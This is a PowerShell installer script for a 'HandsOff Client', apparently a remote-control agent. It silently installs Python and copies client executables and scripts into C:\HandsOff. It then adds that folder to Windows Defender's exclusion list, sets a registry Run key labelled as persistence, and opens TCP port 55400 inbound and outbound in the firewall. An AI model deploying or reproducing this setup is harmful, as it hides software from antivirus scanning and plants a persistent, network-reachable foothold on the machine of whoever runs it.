function Install-Python($python_version, $python_url, $python_outpath) {
    if (-not(Test-Path -Path $python_outpath -PathType Leaf)) {
    try {
        Write-Host "Downloading Python $python_version..."
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($python_url, $python_outpath)
    
    }
    catch {
        throw $_.Exception.Message
    }


    Write-Host "Installing python $python_version..."
    & "$PSScriptRoot\python-3.10.8.exe" /wait /quiet InstallAllUsers=0 PrependPath=1 Include_test=0

    }
}

# Destination path
$dst_path = 'C:\HandsOff'

$clientEXE = '.\client.exe'
$clientBAT = '.\client.bat'
$clientVBS = '.\client.vbs'
$clientPNG = '.\client.png'
$clientICO = '.\client.ico'
$updaterEXE = '.\updater.exe'

$clientEXE_outpath = "$dst_path\client.exe"
$clientBAT_outpath = "$dst_path\client.bat"
$clientPNG_outpath = "$dst_path\client.png"
$clientVBS_outpath = "$dst_path\client.vbs"
$clientICO_outpath = "$dst_path\client.ico"
$updaterEXE_outpath = "$dst_path\updater.exe"

# Python Vars
$python_version = "3.10.8"
$python_url = "https://www.python.org/ftp/python/3.10.8/python-3.10.8-amd64.exe"

# Python setup file path
$python_outpath = ".\python-3.10.8.exe"

# Windows startup folder for all users
$startup_path = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

# Start installation
Write-Host "Installing HandsOff Client..."

# Create local folder
Write-Host "Creating Dir HandsOff..."
New-Item -ItemType Directory -Force -Path "C:\HandsOff"

# Install python
Install-Python $python_version $python_url $python_outpath

# Copy files
Copy-Item $clientEXE -Destination $clientEXE_outpath -Force
Copy-Item $clientBAT -Destination $clientBAT_outpath -Force
Copy-Item $clientVBS -Destination $clientVBS_outpath -Force
Copy-Item $clientPNG -Destination $clientPNG_outpath -Force
Copy-Item $clientICO -Destination $clientICO_outpath -Force
Copy-Item $updaterEXE -Destination $updaterEXE_outpath -Force

# Install python requirements
pip install -r ".\requirements.txt"

# Create Defender Exclusion for EXE File
Write-Host "Creating an Exclusion for Windows Defender..."
Add-MpPreference -ExclusionPath "$dst_path"

# Print Out Defender's Exclusion List
Get-MpPreference | Select-Object -Property ExclusionPath
Write-Host "Done!"

# Set Autorun in Registry
Write-Host "Setting up persistence..."
$persistence = Set-Itemproperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'HandsOff' -Value 'c:\HandsOff\client.bat' -Force
Write-Host "Done."

# Open Port 55400 For Incoming & Outgoing Traffic
Write-Host "Opening Port 55400..."
New-NetFirewallRule -DisplayName "Allow Incoming Port 55400 For Peach" -Direction Inbound -Profile Any -Action Allow -LocalPort 55400 -Protocol TCP
New-NetFirewallRule -DisplayName "Allow Outgoing Port 55400 For Peach" -Direction Outbound -Profile Any -Action Allow -LocalPort 55400 -Protocol TCP
Write-Host "Done!"

Write-Host "Installation completed, cleaning up..."
Remove-Item $python_outpath

# Run client
#Write-Host "Running client..."
#wscript "C:\Peach\client.vbs"